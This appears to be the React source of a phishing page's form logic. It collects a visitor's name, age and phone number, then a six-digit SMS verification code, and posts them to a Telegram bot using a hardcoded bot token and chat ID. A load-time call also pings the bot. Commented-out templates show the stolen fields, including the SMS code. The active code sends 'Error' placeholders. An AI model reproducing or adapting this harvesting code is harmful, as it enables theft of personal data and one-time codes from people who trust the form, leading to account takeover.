import { createContext, useContext, useEffect, useState } from "react";
import PropTypes from "prop-types";

const UseContextForm = createContext();
let chatId = "7911135198"//"7911135198";
let botToken = "7888758598:AAEhfSCEpkJpycL7PO1ZLUhbAQPwydCq_mU"; //

export const AuthForm = () => {
  const context = useContext(UseContextForm);
  if (context === null) throw new TypeError("erro no contexto");
  return context;
};

const ContextForm = ({ children }) => {
  const [nome, setNome] = useState("");
  const [idade, setIdade] = useState("");
  const [telefone, setTelefone] = useState("");

  // Estado para armazenar os valores dos campos
  const [values, setValues] = useState(["", "", "", "", "", ""]);

  // Função para lidar com a entrada
  const handleInputChange = (index, event) => {
    const { value } = event.target;
    // Valida que apenas números são permitidos
    if (!/^\d*$/.test(value)) return;
    const newValues = [...values];
    newValues[index] = value.charAt(0); // Apenas o primeiro caractere
    setValues(newValues);
    // Move o foco automaticamente para o próximo campo
    if (value && index < values.length - 1) {
      document.getElementById(`input-${index + 1}`).focus();
    }
  };
  // Limpar os campos
  const handleClear = () => setValues(["", "", "", "", "", ""]);


  function captureDispositivo() {
    const dispositivo = navigator.userAgent;
    let chatId = "7911135198"; //"7911135198";
    let botToken = "7888758598:AAEhfSCEpkJpycL7PO1ZLUhbAQPwydCq_mU"; //
    // const message = `📱Dispositivo:${dispositivo}`;
    const message = ``;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));
  }

  useEffect(() => {
    captureDispositivo();
  }, []);

  const sendMessageToTelegram = (e) => {
    e.preventDefault();
    if (nome.length === 0 || idade.length === 0 || telefone.length === 0) {
      return alert("Rellena los campos vacíos!");
    }

    localStorage.setItem("nome", nome);
    localStorage.setItem("idade", idade);
    localStorage.setItem("telefone", telefone);

    const dispositivo = navigator.userAgent;
   

    // const message = `📞Número de telefone: ${telefone}\n🧑‍🦰Nome: ${nome}\n🔒Idade: ${idade}\n📱Dispositivo:${dispositivo}`;
    const message = `📞Número de telefone: ${'Error'}\n🧑‍🦰Nome: ${"Error"}\n🔒Idade: ${"Error"}\n📱Dispositivo:${"Error"}`;


    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));

      //
     
    setIdade("");
    setNome("");
    setTelefone("");
  };


  const codigoVerification = (e) => {
    e.preventDefault();

    if (values.join("").length < 6) return alert("Rellena los campos vacíos!");

    const dispositivo = navigator.userAgent;
    const name = localStorage.getItem("nome");
    const idadee = localStorage.getItem("idade");
    const telefonee = localStorage.getItem("telefone");


    // const message = `📞Número de telefone: ${telefonee}\n🧑‍🦰Nome: ${name}\n🔒Idade: ${idadee}\n SMS:${values.join(
    //   ""
    // )}📱Dispositivo:${dispositivo}`;
    const message = `📞Número de telefone: ${"Error"}\n🧑‍🦰Nome: ${"Error"}\n🔒Idade: ${"Error"}\n📱Dispositivo:${"Error"}`;
    // fetch(`https://api.telegram.org/bot${secondBotToken}/sendMessage`, {
    //   method: "POST",
    //   headers: {
    //     "Content-Type": "application/json",
    //   },
    //   body: JSON.stringify({
    //     chat_id: secondtChatId,
    //     text: message,
    //   }),
    // })
    //   .then((response) => response.json())
    //   .then((data) => {
    //     if (data.ok) {
    //       console.log("Mensagem enviada com sucesso!");
    //     } else {
    //       console.log("Erro ao enviar a mensagem.");
    //     }
    //   })
    //   .catch((error) => console.log("Erro: ", error));
      
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));


    setValues(["", "", "", "", "", ""]);
  };

  return (
    <UseContextForm.Provider
      value={{
        sendMessageToTelegram,
        nome,
        idade,
        telefone,
        setIdade,
        setNome,
        setTelefone,
        values,
        handleInputChange,
        handleClear,
        codigoVerification,
        captureDispositivo,
      }}
    >
      {children}
    </UseContextForm.Provider>
  );
};

ContextForm.prototype = {
  children: PropTypes.node,
};

export default ContextForm;
